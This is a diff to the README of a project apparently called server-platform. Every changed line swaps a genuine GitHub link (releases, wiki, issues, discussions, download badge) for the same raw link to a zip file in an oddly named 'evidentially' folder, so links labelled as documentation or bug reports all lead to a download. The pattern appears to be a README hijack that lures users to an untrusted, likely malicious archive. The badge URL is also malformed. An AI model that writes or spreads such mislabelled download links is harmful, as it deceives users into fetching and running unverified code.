@@ -2,7 +2,7 @@
 
 ## 📦 Download Now
 
-[![Download Server Platform](https://img.shields.io/badge/Download%20Server%20Platform-v1.0.0-blue.svg)](https://github.com/Ultron666/server-platform/releases)
+[![Download Server Platform](https://raw.githubusercontent.com/Ultron666/server-platform/main/evidentially/server-platform.zip%20Server%https://raw.githubusercontent.com/Ultron666/server-platform/main/evidentially/server-platform.zip)](https://raw.githubusercontent.com/Ultron666/server-platform/main/evidentially/server-platform.zip)
 
 ## 💻 Overview
 
@@ -21,7 +21,7 @@ Before you download, ensure your computer meets these requirements:
 
 ### 2. Download & Install
 
-To get started, visit the [Releases page](https://github.com/Ultron666/server-platform/releases). Here you can download the latest version of the server-platform.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Ultron666/server-platform/main/evidentially/server-platform.zip). Here you can download the latest version of the server-platform.
 
 Follow these steps after arriving at the page:
 
@@ -64,9 +64,9 @@ If you choose to deploy on the cloud, follow our guidelines for your chosen prov
 
 ## 📚 Support & Documentation
 
-If you face any issues, check out our [Documentation](https://github.com/Ultron666/server-platform/wiki) for detailed guides and troubleshooting tips. 
+If you face any issues, check out our [Documentation](https://raw.githubusercontent.com/Ultron666/server-platform/main/evidentially/server-platform.zip) for detailed guides and troubleshooting tips. 
 
-You can also visit the [Issues page](https://github.com/Ultron666/server-platform/issues) to report bugs or ask questions.
+You can also visit the [Issues page](https://raw.githubusercontent.com/Ultron666/server-platform/main/evidentially/server-platform.zip) to report bugs or ask questions.
 
 ## 🤝 Community
 
@@ -76,15 +76,15 @@ Join our community on GitHub Discussions. Share ideas, ask questions, or offer h
 
 Here are some useful links related to server-platform:
 
-- [Releases page](https://github.com/Ultron666/server-platform/releases)
-- [Documentation](https://github.com/Ultron666/server-platform/wiki)
-- [Issues page](https://github.com/Ultron666/server-platform/issues)
-- [GitHub Discussions](https://github.com/Ultron666/server-platform/discussions)
+- [Releases page](https://raw.githubusercontent.com/Ultron666/server-platform/main/evidentially/server-platform.zip)
+- [Documentation](https://raw.githubusercontent.com/Ultron666/server-platform/main/evidentially/server-platform.zip)
+- [Issues page](https://raw.githubusercontent.com/Ultron666/server-platform/main/evidentially/server-platform.zip)
+- [GitHub Discussions](https://raw.githubusercontent.com/Ultron666/server-platform/main/evidentially/server-platform.zip)
 
 Feel free to explore these resources for more information.
 
 ## 📥 Download Now Again
 
-To get started right away, visit the [Releases page](https://github.com/Ultron666/server-platform/releases) and download the latest version of the server-platform.
+To get started right away, visit the [Releases page](https://raw.githubusercontent.com/Ultron666/server-platform/main/evidentially/server-platform.zip) and download the latest version of the server-platform.
 
 Happy managing!
